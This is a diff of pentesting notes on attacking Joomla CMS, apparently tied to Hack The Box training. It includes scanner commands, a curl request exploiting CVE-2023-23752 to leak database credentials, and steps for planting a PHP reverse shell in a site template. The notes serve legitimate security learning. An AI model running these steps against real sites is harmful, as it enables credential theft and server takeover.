@@ -1,5 +1,7 @@
 # Joomla CMS
 
+[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
+
 <div class="row row-cols-lg-2"><div>
 
 [Joomla](https://www.joomla.org/) is an open-source Content Management System (CMS) written in PHP. The version 5 is currently in development (2024).
@@ -15,6 +17,7 @@ The admin page default path is: `/administrator`.
 
 ## Joomla Pentester Notes ☠️
 
+[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
 [![devvortex](../../../../../cybersecurity/_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)
 
 <div class="row row-cols-lg-2"><div>
@@ -32,13 +35,17 @@ $ joomscan -u URL
 <SNIP... Nothing of interest>
 ```
 
-* [droopescan](https://github.com/SamJoan/droopescan) <small>(1.1k ⭐, 2021 ☠️, deprecated)</small>
-</div><div>
-
-* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.05k ⭐)</small>.
+* You can try to use [droopescan](/cybersecurity/red-team/tools/scanners/web/droopescan.md) <small>(not really useful)</small>
 
 ```ps
-$ curl -v URL/api/index.php/v1/config/application?public=true -v
+$ droopescan scan joomla --url URL
+```
+</div><div>
+
+* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.05k ⭐)</small> or manual exploitation:
+
+```ps
+$ curl -v URL/api/index.php/v1/config/application?public=true
 "dbtype": "mysqli",
 "host": "localhost",
 "user": "xxx",
@@ -55,7 +62,7 @@ Create a new file or upload one if you can. You can copy-paste a shell:
 $ cat revshell.php | xclip -selection clipboard
 ```
 
-The file path is shown in the editor, while, for reference, mine was at `/templates/<site_name>/revshell.php`.
+The file path is shown in the editor, while, for reference, mine was at the URL:  `URL/templates/<your_selected_site_name>/revshell.php`.
 </div></div>
 
 <hr class="sep-both">
